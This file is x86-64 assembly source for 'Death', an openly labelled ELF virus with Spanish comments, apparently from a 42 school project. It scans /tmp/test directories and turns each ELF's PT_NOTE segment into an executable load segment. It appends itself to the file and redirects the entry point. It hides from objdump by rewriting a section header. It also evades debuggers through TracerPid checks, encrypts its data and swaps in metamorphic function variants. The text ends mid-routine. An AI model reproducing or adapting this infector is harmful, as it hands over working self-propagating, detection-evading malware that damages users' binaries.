%include "inc/death.inc"

default rel

section .text

    global _start

    _start:

    jmp _init

; ----------------------------------------- routines -------------------------------------------------------------------

    __F_directory_name_isdigit:
        ; rdi = puntero dirent_buffert
        nop
        nop
        nop
        push rbx
        lea rsi, [rdi + dirent.d_name]
        xor rcx, rcx ; contador
        .bucle:
            mov bl, [rsi + rcx]
            cmp bl, 0
            je .out
            cmp bl, 0x30
            jl .out
            cmp bl, 0x39
            jg .out
            inc rcx
            jmp .bucle
        .out:
            mov al, bl
            pop rbx
        ret
    __F_directory_name_isdigit__end:
	F_directory_name_isdigit_len equ $ - __F_directory_name_isdigit

    __F_close_proc_dir:
        push rax
        push rdi
        mov rax, SC_CLOSE
        mov rdi, VAR(Death.fd_proc)
        syscall ; nos la suda lo que esto retorne la verdad
        pop rdi
        pop rax
        ret
    __F_close_proc_dir__end:

    __F_close_status_file:
        push rax
        push rdi
        mov rax, SC_CLOSE
        mov rdi, VAR(Death.fd_status)
        syscall
        pop rdi
        pop rax
        ret
    __F_close_status_file__end:

    __F_strlen:
        ; calculamos longitud del nombre del directorio PID

        ; rdi = puntero al nombre del directorio (string acabada en 0)
        lea rdi, [r8 + dirent.d_name]
        mov al, 0
        mov rcx, -1   ; 0xffffffffffffffff
        cld
        repne scasb
        ; El negado de 0xffffffffffffffff - el numero de veces que decrementa
        ; hasta encontrar 0, es len + 1. (magia negra asm)
        not rcx
        dec rcx
        ret
    __F_strlen__end:

    __F_mod_pt_note:
        ; Death.note_phdr_ptr es una dirección de memoria que apunta a un puntero
        nop
        nop
        lea rax, VAR(Death.note_phdr_ptr)
        mov rax, [rax]
        mov [rax], dword 0x01                           ; p_type = PT_LOAD
        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
        mov ecx, dword VAR(Death.file_final_len)
        sub ecx, dword VAR(Death.virus_size)
        mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
        mov VAR(Death.virus_offset), rcx
        mov rcx, VAR(Death.max_vaddr_end)
        ALIGN rcx
        mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
        mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
        mov VAR(Death.new_entry), rcx
        mov ecx, dword VAR(Death.virus_size)
        mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
        mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
        mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
        ret
    __F_mod_pt_note__end:
	F_mod_pt_note_len equ $ - __F_mod_pt_note

    __F_ftruncate:
        ; ftruncate(fd_file, file_final_len)
        mov rdi, VAR(Death.fd_file)
        xor rsi, rsi
        mov esi, dword VAR(Death.file_final_len)
        mov rax, SC_FTRUNCATE
        syscall
        test rax, rax
        ret
    __F_ftruncate__end:

    __F_crazy:
        inc rax
        dec rax
        nop
        inc rbx
        dec rbx
        inc rdx
        inc rdx
        dec rdx
        dec rdx
        nop
        cmp rbx, rbx
        mov rax, rax
        xchg rax, rax
        nop word [rax+rax]
        nop dword [rax+rax]
        lea rax, [rax]
        add rax, 0
        sub rax, 0
        or  rax, 0
        and rax, -1
        not rax
        not rax
        cmp rbx, rsi
        ret
    __F_crazy__end:
	F_crazy_len equ $ - __F_crazy

    __F_encrypt_block:
        lea r10, [rel __F_data]         ; base función
        mov rbx, 0x2537683570773774
        mov rax, 0x0404040404040404
        xor rbx, rax

        xor rcx, rcx                    ; contador función
        xor rdx, rdx                    ; índice key

        .encrypt_data_loop:
            mov r8b, [r10 + rcx]
            mov r9b, bl
            xor r8b, r9b
            mov [r10 + rcx], r8b

            ror rbx, 8
            inc rcx
            cmp rcx, (__F_data__end - __F_data)
            jl .encrypt_data_loop
        ret
    __F_encrypt_block__end:

    __F_mmap:
        ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
        mov eax, dword VAR(Death.file_original_len)
        ; align current size to end at 4K page so our payload is aligned by writing it
        ; at the end.
        ALIGN rax
        mov ecx, dword VAR(Death.virus_size)
        add rax, rcx

        ; save aligned size of file + virus size.
        mov dword VAR(Death.file_final_len), eax

        ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
        mov rdi, 0x0
        mov rsi, rax
        mov rdx, PROT_READ | PROT_WRITE
        mov r10, MAP_SHARED
        mov r8, VAR(Death.fd_file)
        mov r9, 0x0
        mov rax, SC_MMAP
        syscall
        ret
    __F_mmap__end:

    __F_atoi:
        ; rax = resultado
        .str_to_int:
            xor rax, rax
        .loop:
            movzx rcx, byte [rsi]   ; cargar caracter
            test rcx, rcx           ; ¿fin de string?
            jz .done
            sub rcx, '0'            ; convertir ASCII a número
            imul rax, rax, 10       ; resultado *= 10
            add rax, rcx            ; resultado += digito
            inc rsi                 ; siguiente caracter
            jmp .loop
        .done:
            ret
    __F_atoi__end:

    __F_set_unique_trace:
        ; rax = integer from atoi(signature)
        ; Sumamos a la firma anterior el tamaño final del fichero.
        ; Esto es para evitar que si lanzamos 2 ejecuciones del mismo virus
        ; sobre q binarios distintos, la firma sea la misma. En este caso, sí será
        ; la misma en caso de que ifectemos con el mismo binario el mismo objetivo.
        ; Pero esa es la gracia, creo. Si no, sería random.
        nop
        nop
        nop
        mov rcx, VAR(Death.file_final_len)
        add rax, rcx

        ; lo transformamos haciendo paranoias
        mov rcx, rax
        shl rcx, 13
        xor rax, rcx

        mov rcx, rax
        shr rcx, 17
        xor rax, rcx

        mov rcx, rax
        shl rcx, 5
        xor rax, rcx

            ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
        and rax, 0x3FFFFFF

        ; rdi = buf
        ; destruye: rax, rbx, rdx, rcx
        lea rdi, [rel Traza]
        add rdi, Traza_len + 1
        add rdi, 8

        ; rcx = contador (para escribir 8 bytes exactos)
        ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
        ; no al principio. Es porque escribimos del final al principio.
        xor rcx, rcx
        sub rsp, 8
        lea rsi, [rsp+7]

        mov rcx, 8
        mov rbx, 10
        .convert_loop:
            ; rax = numerete
            xor rdx, rdx
            div rbx       ; rax / rbx. rdx = resto.

            add dl, '0'
            mov [rsi], dl
            dec rsi
            dec rcx
            jnz .convert_loop

        lea rsi, [rsp]
        lea rdi, [rel Traza]
        add rdi, Traza_len + 1
        mov rcx, 8
        cld
        rep movsb

        add rsp, 8
        ret
    __F_set_unique_trace__end:
    F_set_unique_trace_len equ $ - __F_set_unique_trace


    __F_mod_sh_note:
        ; rsi = shstrab_ptr + note_shdr_ptr.sh_name = el nombre original de la seccion.
        mov rax, VAR(Death.note_shdr_ptr)
        ; ponemos a cero porque vamos a cargar un numero de 4 bits. Si tiene
        ; basura el registro, luego al sumar nos da un numero gigante.
        xor rbx, rbx
        mov ebx, [rax + Elf64_Shdr.sh_name]
        mov rdi, VAR(Death.shstrtab_ptr)
        add rdi, rbx

        ; ponemos .text\0 donde queriamos poner
        lea rsi, [rel text_section_str]
        mov rcx, 6 ; len(".text\0")
        cld
        rep movsb

        ; sh_offset = virus_offset
        mov rbx, VAR(Death.virus_offset)
        mov [rax + Elf64_Shdr.sh_offset], rbx

        ; sh_size = virus_size
        xor rbx, rbx
        mov ebx, dword VAR(Death.virus_size)
        mov [rax + Elf64_Shdr.sh_size], rbx

        ret
    __F_mod_sh_note__end:


    __F_mod_functions:
        xor edx, edx
        lea r8, [rel Traza]
        movzx eax, byte [r8 + Traza_len + 1]
        div ebx

        ; multiplicamos dl * F_crazy_len
        movzx rbx, dl
        xor edx, edx
        mov rax, rcx
        mul rbx

        ; en rax tendemos dl * F_crazy_len
        ; rsi + (dl * F_crazy_len) => direccion de memoria de la funcion a copiar como __F_crazy
        ; rdi                      => direccion de memoria de la __F_crazy a sobreescribir
        ; memcpy(__F_crazy, __F_crazy0 + rax, F_crazy_len);
        add rsi, rax
        cld
        rep movsb
        ret
    __F_mod_functions__end:

    __F_fake_function:
        times 100 nop
    __F_fake_function__end:
    F_fake_function_len equ $ - __F_fake_function

; ----------------------------------------------------------------------------------------------------------------------

    _init:

        PUSH_ALL
        push rsp
        ; this trick allows us to access Death members using the VAR macro
        mov rbp, rsp
        sub rbp, Death_size            ; allocate Death struct on stack

        ; load virus size
        lea rax, _start
        lea rbx, _finish
        sub rbx, rax
        mov dword VAR(Death.virus_size), ebx

        CALL_ENCRYPT(encrypt_block) ; desencripta

    .open_proc:
        ; open("/proc", O_RDONLY, NULL)
        lea rdi, [proc]
        mov rsi, O_RDONLY
        mov rax, SC_OPEN
        syscall
        test rax, rax
        ; si falla el open de /proc, infectamos sin comprobaciones.
        jle .jump_to_host
        mov VAR(Death.fd_proc), rax

    .dirent_proc:
         ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
        mov rdi, VAR(Death.fd_proc)
        lea rsi, VAR(Death.dirent_buffer)
        mov rdx, 1024
        mov rax, SC_GETDENTS64
        syscall
        test rax, rax
        jle .check_tracerpid
        xor r12, r12
        mov rbx, rax

    .check_dir_in_proc:
        ; rbx = bytes escritos en dirent_buffer
        ; r12 = contador de bytes leídos de dirent_buffer
        cmp r12, rbx
        jge .dirent_proc

        lea rdi, VAR(Death.dirent_buffer)
        add rdi, r12

        ; sumamos a r12 el tamaño de el dirent que vamos a procesar.
        movzx ecx, word [rdi + dirent.d_len]
        add r12, rcx

        ; comprobamos si es directorio
        cmp byte [rdi + dirent.d_type], DT_DIR
        jne .check_dir_in_proc

        ; comprobamos que el nombre del directorio se corresponde con un PID
        CALL_ENCRYPT (directory_name_isdigit)
        cmp al, 0

        jne .check_dir_in_proc

    .proces_proc_dir:

        mov r8, rdi   ; guardamos el puntero a la dirent struct

        ; reservamos buffer destino
        sub rsp, 128

        ; escribimos "/proc/" en el stack
        lea rdi, [rsp]
        lea rsi, [proc]
        mov rcx, 6
        cld
        rep movsb

        CALL_ENCRYPT(strlen)

        lea rdi, [rsp]
        add rdi, 6
        lea rsi, [r8 + dirent.d_name]
        ; rcx ya contiene la len a escribir
        cld
        rep movsb

        ; concatenamos "/proc/d_name" + "/exe"

        lea rsi, [exe_string]
        mov rcx, 5
        ; rcx ya contiene la len a escribir
        cld
        rep movsb

        ; rdi = "/proc/PID/exe"
        lea rdi, [rsp]
        sub rsp, 128
        lea rsi, [rsp]
        mov rdx, 128
        mov rax, SC_READLINK
        syscall
        test rax, rax
        ; esto puede pasar a menudo por permisos. Si sucede, seguimos.
        jle .cleanup_and_check_dir_in_proc

        lea rdi, [forbidden_prog + forbidden_prog_len]
        ; apuntamos con rsi al ultimo caracter de la cadena devuelta por readlink
        CALL_ENCRYPT(crazy)
        add rsi, rax
        dec rsi
        mov rcx, forbidden_prog_len
        std
        rep cmpsb
        ; si está el forbidden program corriendo, saltamos al entrypoint
        ; original (no infectamos)
        je .cleanup_and_jump_to_host_0

        ; siguiente directorio.
        jmp .cleanup_and_check_dir_in_proc

    .cleanup_and_jump_to_host_0:
        CALL_ENCRYPT (close_proc_dir)
        add rsp, 256
        jmp .jump_to_host

    .cleanup_and_check_dir_in_proc:
       add rsp, 256
       jmp .check_dir_in_proc

    .check_tracerpid:
        ; abrimos /proc/self/status
        CALL_ENCRYPT (close_proc_dir)
        lea rdi, [rel status_file]
        mov rsi, O_RDONLY
        mov rax, SC_OPEN
        syscall
        test rax, rax
        jle .start_infection

        ; guardamos el valor del fd para poder cerrarlo a posteriori
        mov VAR(Death.fd_status), rax

        ; leemos el ficherín (raro sería que midiese mas de 4KB)
        mov rdi, rax
        sub rsp, 0x1000
        lea rsi, [rsp]
        mov rdx, 0x1000
        mov rax, SC_READ
        syscall
        test rax, rax
        jle .close_status_file_and_infect

        ; inicializamos el buffer del fichero para el rep cmpsb
        xor rbx, rbx
        lea rdi, [rsi]

    .search_trace:
        cmp rbx, rax
        jge .close_status_file_and_infect

        ; Cuando se llama a rep cmpsb, éste shiftea los buffers de rdi y rsi
        ; tantas veces como la comparación haya sido exitosa, y devuelve en rcx
        ; el valor inicial - el numero de iteracions.
        ; Entonces por cada iteracion tenemos que resetear rcx, rsi, pero no hace
        ; falta rdi porque así se recorre el buffer del fichero a medida que se llama.
        lea rsi, [rel tracerPid_str]
        mov rcx, 0xb
        cld
        rep cmpsb
        je .check_tracerPid_value

        ; rcx = 0xb - <número de comparaciones OK>
        ; rbx += 0xb - rcx
        mov rdx, 0xb
        sub rdx, rcx
        add rbx, rdx
        CALL_ENCRYPT(crazy)

        jmp .search_trace

    .cleanup_and_jump_to_host_1:
        add rsp, 0x1000
        CALL_ENCRYPT(close_status_file)
        jmp .jump_to_host

    .check_tracerPid_value:
        ; Comentar estas 2 líneas para debug con gdb

       ; cmp byte [rdi], 0x30 ; == "0"
       ; jne .cleanup_and_jump_to_host_1

    .close_status_file_and_infect:
        add rsp, 0x1000
        CALL_ENCRYPT(close_status_file)

    .start_infection:
        ;load dirs
        CALL_ENCRYPT (close_proc_dir)
        lea rdi, [dirs]

; ----------------------------------------- VIRUS -------------------------------------------------------------------

    .open_dir:
        ; save dirname pointer to iterate after
        mov VAR(Death.dir_name_pointer), rdi

        ; open(rdi, O_RDONLY | O_DIRECTORY);
        mov rsi, O_RDONLY | O_DIRECTORY
        mov rax, SC_OPEN
        syscall
        test rax, rax
        jl .next_dir

        ; save fd
        mov VAR(Death.fd_dir), rax

    ; get directory entry
    .dirent:
        ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
        mov rdi, VAR(Death.fd_dir)
        lea rsi, VAR(Death.dirent_buffer)
        mov rdx, 1024
        mov rax, SC_GETDENTS64
        syscall
        test rax, rax
        jle .close_dir

        xor r12, r12

    ; getdents64 does not return one directory entry. It returns as many directory entries as it can
    ; fit in the buffer passed. This is why the following iteration checks N directory entries and not just one.

    ; rdi = dirent_buffer[0]
    ; r12 = offset from dirent_buffer[0]
    ; rax = total bytes read in getdents
    .check_for_files_in_dirents:
        ; if offset == total_bytes, next entry.
        cmp r12, rax
        jge .dirent

        ; shift offset from the start of the dirent struct array
        lea rdi, VAR(Death.dirent_buffer)
        add rdi, r12
        CALL_ENCRYPT(crazy)
        ; add lenght of directory entry to offset
        movzx ecx, word [rdi + dirent.d_len]
        add r12, rcx

        ; check if the file is DT_REG
        cmp byte [rdi + dirent.d_type], DT_REG
        jne .check_for_files_in_dirents

        add rdi, dirent.d_name

    .openat:
        push rax

        ; openat(fd_dir, d_name (&rsi), O_RDWR);
        lea rsi, [rdi]
        mov rdi, VAR(Death.fd_dir)
        mov rdx, O_RDWR
        mov rax, SC_OPENAT
        syscall
        test rax, rax
        jle .skip_file

        mov VAR(Death.fd_file), rax

    .fstat:
        sub rsp, 144                ;fstat struct buffer
        lea rsi, [rsp]
        mov rdi, rax
        mov rax, SC_FSTAT
        syscall
        test rax, rax
        jl .end_fstat

        ; file type
        mov eax, dword [rsp + 24]   ; st-mode fstat struct
        and eax, S_IFMT             ; bytes file type
        cmp eax, S_IFREG            ; reg file type
        jne .close_file
        mov rax, [rsp + 48]
        mov dword VAR(Death.file_original_len), eax

        jmp .check_ehdr

    .end_fstat:
        add rsp, 144
        jmp .close_file

    .check_ehdr:
        add rsp, 144                        ; deallocate fstat struct from stack

        ; read(fd_file, rsi, 64);
        mov rdi, VAR(Death.fd_file)
        sub rsp, Elf64_Ehdr_size            ; alloc sizeof(Elf64_Ehdr) on stack
        lea rsi, [rsp]                      ; rsi = &rsp
        mov rdx, Elf64_Ehdr_size
        mov rax, SC_READ
        syscall

        cmp dword [rsp], MAGIC_NUMBERS      ; magic number
        jne .check_ehdr_error

        cmp byte [rsp + 4], 2               ; EI_CLASS = 64 bits
        jne .check_ehdr_error

        cmp byte [rsp + 5], 1               ; EI_DATA = little endian
        jne .check_ehdr_error

        add rsp, Elf64_Ehdr_size
        jmp .mmap

    .check_ehdr_error:
        add rsp, Elf64_Ehdr_size
        jmp .close_file

    .mmap:

        CALL_ENCRYPT(mmap)
        test rax, rax
        jle .close_file
        mov VAR(Death.mmap_ptr), rax   ; save mmap_ptr

    .check_infect:
        mov rcx, dword _finish - Traza
        mov rsi, rax
        mov ebx, dword VAR(Death.file_original_len)
        add rsi, rbx
        sub rsi, rcx
        lea rdi, Traza
        mov rcx, Traza_len
        cld                 ; incremental
        rep cmpsb           ; comparar rdi y rsi rcx bytes
        je .munmap

    .infect:
        mov rbx, [rax + Elf64_Ehdr.e_entry]         ; rbx = &(rax + e_entry)
        mov VAR(Death.original_entry), rbx     ; save original_entry
        lea rbx, [rax + Elf64_Ehdr.e_phoff]         ; rbx = &(rax + e_phoff)
        mov rbx, [rbx]                              ; rbx = rax + *(rbx)
        add rbx, rax
        movzx eax, word [rax + Elf64_Ehdr.e_phnum]
        ; initialize variables seeked in loop header
        xor ecx, ecx
        mov VAR(Death.note_phdr_ptr), rcx
        mov VAR(Death.max_vaddr_end), rcx

    ;rax = phnum
    ;rbx = phdr_pointer
    .loop_phdr:
        cmp rax, 0
        jle .end_loop_phdr
        ; lo que sea de rbx
        cmp dword [rbx], 0x01 ;PT_LOAD
        je .compute_max_vaddr_end
        cmp dword [rbx], 0x04 ;PT_NOTE
        je .assign_pt_note_phdr
        jne .next_phdr
        jmp .end_loop_phdr

    .assign_pt_note_phdr:
        cmp qword VAR(Death.note_phdr_ptr), 0x0
        jne .next_phdr
        mov VAR(Death.note_phdr_ptr), rbx
        jmp .next_phdr

    .compute_max_vaddr_end:
        ; r8 = p_vaddr + p_memsz
        mov r8, [rbx+Elf64_Phdr.p_vaddr]
        add r8, [rbx+Elf64_Phdr.p_memsz]
        ; if p_vaddr + p_memsz > max_vaddr_end:
        cmp r8, VAR(Death.max_vaddr_end)
        jl .next_phdr
        ; save new max_vaddr_end
        mov VAR(Death.max_vaddr_end), r8

    .next_phdr:
        dec rax
        add rbx, Elf64_Phdr_size ; siguiente nodo del phdr
        jmp .loop_phdr

    .end_loop_phdr:
        cmp qword VAR(Death.note_phdr_ptr), 0x0
        je .munmap
        cmp qword VAR(Death.max_vaddr_end), 0x0
        je .munmap

    .ftruncate:
        CALL_ENCRYPT(ftruncate)
        jnz .munmap

    ; La historia de esto es que con el objdump -D no imprime la seccion
    ; infectada porque no tiene un section header apuntandole. Aqui secuestramos
    ; el section header que se corresponde con el pt note que hemos usado para
    ; la infeccion para que apunte a nuestro código.
    .load_relevant_section_headers:

        mov rax, VAR(Death.note_phdr_ptr)
        mov r8, [rax + Elf64_Phdr.p_offset]

        ; Buscamos un section header cuyo offset coincida con el offset del phdr.
        mov rax, VAR(Death.mmap_ptr)        ; Elf64_Ehdr está al principio del mapeo
        mov rbx, [rax + Elf64_Ehdr.e_shoff]
        add rbx, rax                        ; map + offset = direccion del shtab
        movzx edx, word [rax + Elf64_Ehdr.e_shnum]

        ; iteramos los program headers.
        .search_note_section_header:
            test rdx, rdx
            jz .munmap
            ; si el offset coincide, es el que buscamos. No puede haber solapamiento aquí
            cmp r8, [rbx + Elf64_Shdr.sh_offset]
            je .save_note_shdr_ptr

            ; siguiente iteracion
            dec rdx
            add rbx, Elf64_Shdr_size
            jmp .search_note_section_header

        .save_note_shdr_ptr:
            mov VAR(Death.note_shdr_ptr), rbx

        .get_shstrtab:
            ; cargamos el indice del section header array que se corresponde
            ; con la shstrtab
            movzx ebx, word [rax + Elf64_Ehdr.e_shstrndx]

            ; r8 = inicio del section header array (perderemos rax en la multiplicacion)
            mov r8, [rax + Elf64_Ehdr.e_shoff]
            add r8, rax

            ; calculamos rax = e_shstrndx * Elf64_Shdr_size
            xor edx, edx
            mov rax, Elf64_Shdr_size
            mul rbx

            ; sumamos el offset al inicio del array
            add r8, rax

            ; r8 apunta ahora al section header del shstrtab.
            mov rax, VAR(Death.mmap_ptr)          ; rax = map_ptr
            add rax, [r8 + Elf64_Shdr.sh_offset]  ; rax += *(r8 + lf64_Shdr.sh_offset)

            ; rax apunta ahora al inicio de la shstrtab
            mov VAR(Death.shstrtab_ptr), rax

    .mod_headers:
        CALL_ENCRYPT(mod_pt_note)
        CALL_ENCRYPT(mod_sh_note)

    .unique_trace:
        xor rax, rax
        lea rsi, [rel Traza]
        add rsi, Traza_len + 1
        CALL_ENCRYPT(atoi)
        ; rax = el valor del contador que setea la signature
        CALL_ENCRYPT(set_unique_trace)

	.mod_functions:
        CALL_METAMORPH(crazy, 7)
        CALL_METAMORPH(mod_pt_note, 2)
        CALL_METAMORPH(directory_name_isdigit, 3)
        CALL_METAMORPH(fake_function, 4)

    .encrypt_data_block:
        CALL_ENCRYPT(encrypt_block) ; encripta

    .write_payload:
        lea rsi, _start
        mov rdi, VAR(Death.mmap_ptr)
        add rdi, VAR(Death.virus_offset)
        ; nos guardamos el address del mmap que se corresponde con el principio
        ; del virus, movsb modifica este valor.
        push rdi
        mov ecx, dword VAR(Death.virus_size)
        cld
        rep movsb
        pop rdi
        ; Patch host_entrypoint en el mmap con el entrypoint original
        mov rax, VAR(Death.original_entry)
        mov [rdi + (host_entrypoint - _start)], rax
        ; Patch virus_vaddr en el mmap con el nuevo entrypoint
        mov rax, VAR(Death.new_entry)
        mov [rdi + (virus_vaddr - _start)], rax
        ; Cambiar e_entry en el ELF Header
        mov rax, VAR(Death.mmap_ptr)
        mov rbx, VAR(Death.new_entry)
        mov [rax + Elf64_Ehdr.e_entry], rbx

        CALL_ENCRYPT(encrypt_block) ; desencipta

    .munmap:
        ;munmap(map_ptr, len)
        mov rdi, VAR(Death.mmap_ptr)
        mov esi, dword VAR(Death.file_final_len)
        mov rax, SC_UNMAP
        syscall

    .close_file:
        ; TODO llamar al munmap antes de cerrar el fd.
        mov rdi, VAR(Death.fd_file)
        mov rax, SC_CLOSE
        syscall

    .skip_file:
        pop rax
        jmp .check_for_files_in_dirents

    .close_dir:
        mov rax, SC_CLOSE
        mov rdi, VAR(Death.fd_dir)
        syscall

    .next_dir:
        mov rsi, VAR(Death.dir_name_pointer)

    .find_null:
        cld
        lodsb               ; al = *rsi++
        test al, al
        jnz .find_null
        mov rdi, rsi
        cmp byte [rdi], 0   ; find double null
        jnz .open_dir

    .jump_to_host:
        mov rsp, rbp
        add rsp, Death_size
        pop rsp
        POP_ALL
        ; Calcular dirección de retorno
        lea rax, [rel _start]               ; Dirección absoluta de _start ahora mismo
        sub rax, [rel virus_vaddr]          ; Base real (Absoluta - Virtual)
        add rax, [rel host_entrypoint]      ; Dirección host (Base + Offset)
        jmp rax

    _dummy_host_entrypoint:
        mov rax, SC_EXIT
        xor rdi, rdi
        syscall

    __F_data:
    tracerPid_str   db      0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0x9  ;"TracerPid:",0x9 ; 11
    status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
    forbidden_prog  db      "/vim"
    forbidden_prog_len equ  $ - forbidden_prog - 1
    exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
    dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
    proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
    text_section_str db     ".text",0
    __F_data__end:
    host_entrypoint dq      _dummy_host_entrypoint
    virus_vaddr     dq      _start
    fix_char        db      0
    Traza           db      "Death version 1.0 (c)oded by tomartin & carce-bo 42069420",0  ;46
    Traza_len       equ     $ - Traza - 1 - 8 - 1

    __F_crazy_0:
        inc rax
        dec rax
        nop
        inc rbx
        dec rbx
        inc rdx
        inc rdx
        dec rdx
        dec rdx
        nop
        cmp rbx, rbx
        mov rax, rax
        xchg rax, rax
        nop word [rax+rax]
        nop dword [rax+rax]
        lea rax, [rax]
        add rax, 0
        sub rax, 0
        or  rax, 0
        and rax, -1
        not rax
        not rax
        cmp rbx, rsi
        ret
    __F_crazy_0__end:

    __F_crazy_1:
        dec rax
        nop
        inc rbx
        dec rbx
        inc rax
        inc rdx
        inc rdx
        dec rdx
        dec rdx
        nop
        cmp rbx, rbx
        mov rax, rax
        xchg rax, rax
        nop word [rax+rax]
        nop dword [rax+rax]
        lea rax, [rax]
        add rax, 0
        sub rax, 0
        or  rax, 0
        and rax, -1
        not rax
        not rax
        cmp rbx, rsi
        ret
    __F_crazy_1__end:

    __F_crazy_2:
        inc rax
        dec rax
        nop
        inc rbx
        dec rbx
        inc rdx
        inc rdx
        dec rdx
        dec rdx
        nop
        cmp rbx, rbx
        mov rax, rax
        xchg rax, rax
        nop word [rax+rax]
        nop dword [rax+rax]
        lea rax, [rax]
        add rax, 0
        sub rax, 0
        or  rax, 0
        and rax, -1
        not rax
        not rax
        cmp rbx, rsi
        ret
    __F_crazy_2__end:

    __F_crazy_3:
        inc rbx
        inc rax
        dec rax
        nop
        dec rbx
        inc rdx
        inc rdx
        dec rdx
        dec rdx
        nop
        cmp rbx, rbx
        mov rax, rax
        xchg rax, rax
        nop word [rax+rax]
        nop dword [rax+rax]
        lea rax, [rax]
        add rax, 0
        sub rax, 0
        or  rax, 0
        and rax, -1
        not rax
        not rax
        cmp rbx, rsi
        ret
    __F_crazy_3__end:

    __F_crazy_4:
        inc rbx
        dec rbx
        inc rdx
        inc rdx
        dec rdx
        dec rdx
        inc rax
        dec rax
        nop
        nop
        cmp rbx, rbx
        mov rax, rax
        xchg rax, rax
        nop word [rax+rax]
        nop dword [rax+rax]
        lea rax, [rax]
        add rax, 0
        sub rax, 0
        or  rax, 0
        and rax, -1
        not rax
        not rax
        cmp rbx, rsi
        ret
    __F_crazy_4__end:

    __F_crazy_5:
        dec rdx
        dec rdx
        nop
        cmp rbx, rbx
        mov rax, rax
        xchg rax, rax
        nop word [rax+rax]
        nop dword [rax+rax]
        lea rax, [rax]
        add rax, 0
        inc rax
        dec rax
        nop
        inc rbx
        dec rbx
        inc rdx
        inc rdx
        sub rax, 0
        or  rax, 0
        and rax, -1
        not rax
        not rax
        cmp rbx, rsi
        ret
    __F_crazy_5__end:

    __F_crazy_6:
        dec rdx
        dec rdx
        nop
        cmp rbx, rbx
        mov rax, rax
        xchg rax, rax
        nop word [rax+rax]
        nop dword [rax+rax]
        lea rax, [rax]
        inc rax
        dec rax
        nop
        inc rbx
        dec rbx
        inc rdx
        inc rdx
        add rax, 0
        sub rax, 0
        or  rax, 0
        and rax, -1
        not rax
        not rax
        cmp rbx, rsi
        ret
    __F_crazy_6__end:

    __F_mod_pt_note_0:
        ; Death.note_phdr_ptr es una dirección de memoria que apunta a un puntero
        nop
        lea rax, VAR(Death.note_phdr_ptr)
        mov rax, [rax]
        mov [rax], dword 0x01                           ; p_type = PT_LOAD
        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
        mov ecx, dword VAR(Death.file_final_len)
        sub ecx, dword VAR(Death.virus_size)
        mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
        mov VAR(Death.virus_offset), rcx
        mov rcx, VAR(Death.max_vaddr_end)
        ALIGN rcx
        mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
        mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
        mov VAR(Death.new_entry), rcx
        mov ecx, dword VAR(Death.virus_size)
        mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
        mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
        mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
        nop
        ret
    __F_mod_pt_note_0__end:

    __F_mod_pt_note_1:
        ; Death.note_phdr_ptr es una dirección de memoria que apunta a un puntero
        lea rax, VAR(Death.note_phdr_ptr)
        mov rax, [rax]
        mov [rax], dword 0x01                           ; p_type = PT_LOAD
        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
        mov ecx, dword VAR(Death.file_final_len)
        sub ecx, dword VAR(Death.virus_size)
        mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
        mov VAR(Death.virus_offset), rcx
        mov rcx, VAR(Death.max_vaddr_end)
        ALIGN rcx
        mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
        mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
        mov VAR(Death.new_entry), rcx
        mov ecx, dword VAR(Death.virus_size)
        mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
        mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
        mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
        nop
        nop
        ret
    __F_mod_pt_note_1__end:

    __F_set_unique_trace_0:
        nop
        nop
        nop
        mov rcx, VAR(Death.file_final_len)
        add rax, rcx

        ; lo transformamos haciendo paranoias
        mov rcx, rax
        shl rcx, 13
        xor rax, rcx

        mov rcx, rax
        shr rcx, 17
        xor rax, rcx

        mov rcx, rax
        shl rcx, 5
        xor rax, rcx

            ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
        and rax, 0x3FFFFFF

        ; rdi = buf
        ; destruye: rax, rbx, rdx, rcx
        lea rdi, [rel Traza]
        add rdi, Traza_len + 1
        add rdi, 8

        ; rcx = contador (para escribir 8 bytes exactos)
